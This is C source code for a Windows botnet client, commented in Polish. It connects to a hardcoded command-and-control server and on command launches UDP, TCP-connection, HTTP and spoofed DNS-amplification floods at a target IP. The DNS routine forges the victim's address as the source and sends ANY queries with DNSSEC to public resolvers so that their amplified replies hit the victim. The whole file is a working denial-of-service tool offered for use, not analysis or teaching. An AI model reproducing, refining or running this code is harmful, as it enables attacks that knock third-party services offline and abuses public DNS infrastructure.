#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <time.h>
#include <pthread.h> // Zakładam że masz pthreads-win32 dla Windows

#pragma comment(lib, "ws2_32.lib")

#define sleep(x) Sleep(1000 * (x))
#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#define close closesocket

struct iphdr {
    unsigned int ihl:4;
    unsigned int version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udphdr {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

// ==========================================
// KONFIGURACJA BOTA C2
// ==========================================
#define MASTER_IP "93.115.101.182"
#define MASTER_PORT 11290
#define NUM_THREADS 4  // Zoptymalizowane pod ilosc rdzeni, bez zabijania CPU przez Context Switching
volatile int stop_attack = 0;
time_t attack_end_time = 0;

typedef struct {
    char ip[64];
    int port;
    char method[16];
} AttackArgs;

// Helper by wymusić twardy reset gniazda i uniknąć TIME_WAIT, co zabija moc
void set_linger(int sock) {
    struct linger sl;
    sl.l_onoff = 1;
    sl.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&sl, sizeof(sl));
}

void *udp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char payload[1400]; // Max UDP payload mniejsze niz MTU (zeby uniknac fragmentacji)
    for(int i = 0; i < 1400; i++) payload[i] = rand() % 255;

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        // Optymalizacja buffora dla max predkosci
        int bufsize = 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char *)&bufsize, sizeof(bufsize));
        
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        
        for(int i = 0; i < 2000; i++) {
            if(stop_attack) break;
            // Bezpieczny rozmiar omijajacy filtry fragmentacji (MTU 1500)
            int size = (rand() % 800) + 500; 
            send(sock, payload, size, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *tcp_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char payload[1024];
    for(int i = 0; i < 1024; i++) payload[i] = rand() % 255;

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        set_linger(sock); // Zapobiega TIME_WAIT
        
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
        
        // Czysty Connection Flood: szybkie nawiazanie polaczenia i natychmiastowe zerwanie, omijamy zator (Congestion Control)
        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            // Wyczerpujemy tablice stanow firewalla bez wysylania gigabajtow smieci
            send(sock, payload, 16, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *http_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    target.sin_addr.s_addr = inet_addr(args->ip);

    char request[512];
    snprintf(request, sizeof(request), 
             "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n", 
             args->ip);

    int req_len = strlen(request);

    while(time(NULL) < attack_end_time && !stop_attack) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        set_linger(sock); // Zapobiega zapchaniu portów
        
        // Brak Pipeliningu - jedno zapytanie na gniazdo, w pelni zgodne z nowymi serwerami
        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            send(sock, request, req_len, MSG_NOSIGNAL);
        }
        close(sock);
    }
    return NULL;
}

void *dns_flood(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    
    // Przykładowa lista Open Resolvers (w prawdziwej ddosiarcze byłaby wczytywana z pliku/bazy)
    const char *resolvers[] = {
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"
    };
    int num_resolvers = sizeof(resolvers) / sizeof(resolvers[0]);

    // Raw socket do IP Spoofingu (wymaga roota!)
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed. Root privileges required for raw sockets");
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char *)val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sock);
        return NULL;
    }

    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    unsigned char *dns_payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    // Budowa Payloadu DNS: Zapytanie ANY dla domeny rządowej (.gov) + DNSSEC
    // Transaction ID: 0x1234 (będzie losowane w pętli)
    // Flags: 0x0100 (Standard query)
    // Questions: 1, Answer RRs: 0, Authority RRs: 0, Additional RRs: 1 (dla DNSSEC/EDNS0)
    unsigned char dns_base[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
        // Zapytanie o fbi.gov (przykładowa domena o wysokim współczynniku)
        0x03, 'f', 'b', 'i', 0x03, 'g', 'o', 'v', 0x00,
        0x00, 0xff, // Typ: ANY (255)
        0x00, 0x01, // Klasa: IN (1)
        // EDNS0 (OPT record) dla DNSSEC (zwiększa rozmiar odpowiedzi, DO bit set)
        0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
    };
    int dns_len = sizeof(dns_base);

    // Nagłówek IP
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
    iph->id = htonl(54321); // Identyfikator pakietu
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; // Checksum wyliczany przez kernel zazwyczaj, lub zostawiony na 0 dla spoofingu zalezy od sys
    iph->saddr = inet_addr(args->ip); // SPOOFING: Adres źródłowy to adres OFIARY!
    // Docelowy adres ustawiany w pętli (Resolver)

    // Nagłówek UDP
    udph->source = htons(args->port > 0 ? args->port : (rand() % 60000 + 1024)); // Port źródłowy ofiary (lub losowy)
    udph->dest = htons(53); // Port docelowy DNS (53)
    udph->len = htons(sizeof(struct udphdr) + dns_len);
    udph->check = 0; // Opcjonalne w UDP

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;

    while (time(NULL) < attack_end_time && !stop_attack) {
        // Asynchroniczna pętla wypuszczająca śmieci, rotacja resolverów
        for (int i = 0; i < 5000; i++) {
            if (stop_attack) break;
            
            // Rotacja serwera docelowego (Resolvera)
            const char *resolver_ip = resolvers[rand() % num_resolvers];
            iph->daddr = inet_addr(resolver_ip);
            dest_addr.sin_addr.s_addr = iph->daddr;

            // Losowanie Transaction ID
            dns_base[0] = rand() % 255;
            dns_base[1] = rand() % 255;
            
            // Kopiowanie aktualnego payloadu DNS do pakietu
            memcpy(dns_payload, dns_base, dns_len);

            // Wysyłanie sfałszowanego pakietu
            sendto(sock, packet, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
    }
    close(sock);
    return NULL;
}

void start_attack(char *method, char *ip, int port, int duration) {
    if (!stop_attack && attack_end_time > time(NULL)) {
        stop_attack = 1;
        sleep(1); // Czekamy chwile az stare watki obumra
    }
    stop_attack = 0;
    attack_end_time = time(NULL) + duration;
    
    static AttackArgs args;
    strncpy(args.ip, ip, sizeof(args.ip));
    args.port = port;
    strncpy(args.method, method, sizeof(args.method));

    printf("[*] Rozpoczynam bezlitosny atak %s na %s:%d przez %d sekund (%d watkow)\n", method, ip, port, duration, NUM_THREADS);

    pthread_t threads[NUM_THREADS];
    for(int i = 0; i < NUM_THREADS; i++) {
        if(strcmp(method, "udp") == 0) {
            pthread_create(&threads[i], NULL, udp_flood, (void *)&args);
        } else if(strcmp(method, "tcp") == 0) {
            pthread_create(&threads[i], NULL, tcp_flood, (void *)&args);
        } else if(strcmp(method, "http") == 0) {
            pthread_create(&threads[i], NULL, http_flood, (void *)&args);
        } else if(strcmp(method, "dns") == 0) {
            pthread_create(&threads[i], NULL, dns_flood, (void *)&args);
        }
    }
    
    // Wątki działają w tle (detach), główny wątek wraca do nasłuchiwania Mastera
    for(int i = 0; i < NUM_THREADS; i++) {
        pthread_detach(threads[i]);
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    printf("======================================\n");
    printf("   [!] BOT (C) URUCHOMIONY NA VPS [!]\n");
    printf("   [!] WERSJA: NIEOGRANICZONA MOC [!]\n");
    printf("======================================\n");

    while(1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(MASTER_PORT);
        server.sin_addr.s_addr = inet_addr(MASTER_IP);

        printf("[*] Szukam Mastera na %s:%d...\n", MASTER_IP, MASTER_PORT);

        if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            sleep(5);
            close(sock);
            continue;
        }

        // Czekamy na "Podaj haslo:" lub prompt i wysyłamy autoryzację
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);
        send(sock, "bot_secret_xyz\n", 15, 0);
        
        printf("[+] Polaczono z C2. Czekam na krew...\n");

        while(1) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer)-1, 0);
            
            if(bytes_received <= 0) {
                printf("[!] Rozlaczono z Masterem.\n");
                break;
            }

            // Usunięcie znaków nowej linii
            buffer[strcspn(buffer, "\r\n")] = 0;

            if(strcmp(buffer, "PING") == 0) continue;

            if(strcmp(buffer, "stop") == 0) {
                printf("[*] Otrzymano rozkaz przerwania ataku!\n");
                stop_attack = 1;
                continue;
            }

            // Analiza komendy: udp <ip> <port> <time>
            char method[16], ip[64];
            int port, duration;
            if(sscanf(buffer, "%15s %63s %d %d", method, ip, &port, &duration) == 4) {
                if(strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0 || strcmp(method, "http") == 0 || strcmp(method, "dns") == 0) {
                    start_attack(method, ip, port, duration);
                }
            }
        }
        close(sock);
        sleep(5);
    }
    return 0;
}
